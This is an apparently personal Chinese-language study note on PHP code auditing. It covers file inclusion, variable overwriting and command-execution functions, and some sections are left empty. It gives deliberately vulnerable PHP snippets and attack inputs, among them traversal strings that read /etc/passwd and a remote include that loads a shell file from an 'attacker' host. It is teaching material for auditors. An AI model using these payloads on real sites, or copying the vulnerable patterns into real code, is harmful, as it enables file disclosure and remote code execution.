# PHP 代码审计

## 文件包含

常见的导致文件包含的函数有：

- PHP: `include()` `include_once()` `require()` `require_once()` `fopen()` `readfile()` 等
- JSP / Servlet: `ava.io.File()` `java.io.FileReader()` 等
- ASP: `include file` `include virtual` 等

当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。

### 本地文件包含

本地文件包含，Local File Inclusion，LFI。

```php
<?php
$file = $_GET['file'];
if (file_exists('/home/wwwrun/'.$file.'.php')) {
  include '/home/wwwrun/'.$file.'.php';
}
?>
```

上述代码存在本地文件包含，可用 %00 截断的方式读取 `/etc/passwd` 文件内容。

- %00 截断

  `?file=../../../../../../../../../etc/passwd%00`

  需要 `magic_quotes_gpc=off`，PHP 小于 5.3.4 有效。

- 路径长度截断

  `?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.`

  Linux 需要文件名长于 4096，Windows 需要长于 256。

- 点号截断

  `?file=../../../../../../../../../boot.ini/………[…]…………`

  只适用 Windows，点号需要长于 256。

### 远程文件包含

远程文件包含，Remote File Inclusion，RFI。

```php
<?php
if ($route == "share") {
  require_once $basePath . "/action/m_share.php";
} elseif ($route == "sharelink") {
  require_once $basePath . "/action/m_sharelink.php";
}
```

构造变量 `basePath` 的值。

```
/?basePath=http://attacker/phpshell.txt?
```

最终的代码执行了

```php
require_once "http://attacker/phpshell.txt?/action/m_share.php";
```

问号后的部分被解释为 URL 的 querystring，这也是一种”截断“。

- 普通远程文件包含

  `?file=[http|https|ftp]://example.com/shell.txt`

  需要 `allow_url_fopen=On` 并且 `allow_url_include=On`。

- 利用 PHP 流 input

  `?file=php://input`

  需要 `allow_url_include=On`。

- 利用 PHP 流 filter

  `?file=php://filter/convert.base64-encode/resource=index.php`

  需要 `allow_url_include=On`。

- 利用 data URIs

  `?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`

  需要 `allow_url_include=On`。

- 利用 XSS 执行

  `?file=http://127.0.0.1/path/xss.php?xss=phpcode`

  需要 `allow_url_fopen=On`，`allow_url_include=On` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。

## 文件上传



## 变量覆盖

### 全局变量覆盖

变量如果未被初始化，且能够用户所控制，那么很可能会导致安全问题。

```ini
register_globals=ON
```

示例

```php
<?php
echo "Register_globals: " . (int)ini_get("register_globals") . "<br/>";

if ($auth) {
  echo "private!";
}
?>
```

当 `register_globals=ON` 时，提交 `test.php?auth=1`，`auth` 变量将自动得到赋值。

### `extract()` 变量覆盖

`extract()` 函数能够将变量从数组导入到当前的符号表，其定义为

```
int extract ( array $var_array [, int $extract_type [, string $prefix ]] )
```

其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 `EXTR_OVERWRITE` 和 `EXTR_SKIP`。

当值为 `EXTR_OVERWRITE` 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 `EXTR_SKIP` 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 `EXTR_OVERWRITE`。

```php
<?php
$auth = "0";
extract($_GET);

if ($auth == 1) {
  echo "private!";
} else {
  echo "public!";
}
?>
```

当 `extract()` 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。

### `import_request_variables` 变量覆盖

```
bool import_request_variables (string $types [, string $prefix])
```

`import_request_variables` 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。

```php
<?php
$auth = "0";
import_request_variables("G");

if ($auth == 1) {
  echo "private!";
} else {
  echo "public!";
}
?>
```

`import_request_variables("G")` 指定导入 GET 请求中的变量，提交 `test.php?auth=1` 出现变量覆盖。

### `parse_str()` 变量覆盖

```
void parse_str ( string $str [, array &$arr ])
```

`parse_str()` 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。

```php
// var.php?var=new  变量覆盖
$var = "init";
parse_str($_SERVER["QUERY_STRING"]);
print $var;
```

与 `parse_str()` 类似的函数还有 `mb_parse_str()`。

## 命令执行

### 直接执行代码

PHP 中有不少可以直接执行代码的函数。

```php
eval();
assert();
system();
exec();
shell_exec();
passthru();
escapeshellcmd();
pcntl_exec();
等
```

### `preg_replace()` 代码执行

`preg_replace()` 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。

```php
<?php
$var = "<tag>phpinfo()</tag>";
preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
?>
```

如果没有 `/e` 修饰符，可以尝试 %00 截断。

### 动态函数执行

用户自定义的函数可以导致代码执行。

```php
<?php
$dyn_func = $_GET["dyn_func"];
$argument = $_GET["argument"];
$dyn_func($argument);
?>
```



## PHP 特性



## 寻找源代码备份

